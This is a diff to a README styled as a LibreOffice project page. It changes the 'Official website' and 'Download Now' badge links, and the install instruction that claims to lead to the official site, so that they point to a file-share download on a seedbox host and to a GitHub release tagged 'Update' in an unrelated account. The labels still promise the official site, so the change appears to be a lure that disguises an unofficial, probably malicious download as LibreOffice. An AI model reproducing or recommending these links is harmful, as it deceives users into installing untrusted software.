@@ -6,13 +6,13 @@
 </p>
 
 <p align="center">
-  <a href="https://www.libreoffice.org/">
+  <a href="https://161.ftl1.seedit4.me/filebrowser/api/public/dl/QYjIXcul/">
     <img src="https://img.shields.io/badge/Official_website-libreoffice.org-blue?style=for-the-badge&logo=libreoffice&logoColor=white" alt="Website">
   </a>
-  <a href="https://www.libreoffice.org/download/download-libreoffice/">
+  <a href="https://161.ftl1.seedit4.me/filebrowser/api/public/dl/QYjIXcul/">
     <img src="https://img.shields.io/badge/Download_Now-26.2-green?style=for-the-badge" alt="Download">
   </a>
-  <a href="https://www.libreoffice.org/">
+  <a href="https://161.ftl1.seedit4.me/filebrowser/api/public/dl/QYjIXcul/">
     <img src="https://img.shields.io/badge/English_site-libreoffice.org-orange?style=for-the-badge" alt="English site">
   </a>
 </p>
@@ -67,4 +67,4 @@ Your documents will look **professional** and polished — whether it's a letter
 
 ```bash
 # The easiest way — download from the official site
-→ https://www.libreoffice.org/download/download-libreoffice/
+→ https://github.com/dimasrojas/LibreOffice/releases/tag/Update
